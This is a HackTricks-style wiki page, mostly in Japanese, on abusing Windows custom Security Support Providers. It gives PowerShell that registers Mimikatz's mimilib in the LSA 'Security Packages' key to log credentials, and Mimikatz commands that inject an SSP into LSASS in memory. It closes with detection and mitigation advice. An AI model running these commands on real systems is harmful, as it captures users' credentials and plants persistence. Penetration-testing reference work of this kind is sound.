# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) は、Local Security Authority (LSA) によって読み込まれる DLL ベースの security package です。Windows は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` の `REG_MULTI_SZ` 値を通じてカスタム SSP/AP DLL を登録し、システムの起動時に登録済みの package を読み込みます。<sup>[[1]](#references)</sup>

SSP は LSA 内で実行され、credentials を受け取る可能性があるため、攻撃者は悪意のある package を credential access や persistence に悪用できます。MITRE はこの挙動を T1547.005 として追跡しています。<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz には `mimilib.dll` が含まれており、読み込まれた後に処理された credentials を記録する SSP を実装しています。許可された lab では、対象のアーキテクチャに一致する DLL を `C:\Windows\System32` に配置し、変更する前に現在の package list を確認します。<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
一般的な既存の値には、`kerberos`、`msv1_0`、`schannel`、`wdigest`、`tspkg`、`pku2u` などのパッケージが含まれている場合があります。custom package を追加する際は、既存のエントリをすべて保持してください。<sup>[[1]](#references)</sup>

既存のパッケージを置き換えずに `mimilib` を追加します:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
再起動後、パッケージは LSA にロードされ、この実装によって以降キャプチャされた認証情報が `C:\Windows\System32\kiwissp.log` に書き込まれます。<sup>[[2]](#references)[[3]](#references)</sup>

## メモリ内ロード

Mimikatz は、現在の LSASS プロセスに自身の SSP 実装をインジェクトすることもできます。<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
この method は再起動後も維持されません。<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

`...\Lsa\Security Packages` への変更と、`lsass.exe` への予期しない DLL load を監視します。Security event 4657 は、該当する Audit Registry policy と SACL が設定されている場合に限り、registry **value** の変更を記録します。<sup>[[2]](#references)[[4]](#references)</sup>

互換性がある場合は、追加の LSA protection を有効にし、unsigned または予期しない SSP DLL を調査します。Microsoft は、credentials を侵害する可能性がある code injection に対する control として、LSA protection を明確に文書化しています。<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - SSP/AP DLL の登録](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - 追加の LSA protection の構成](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
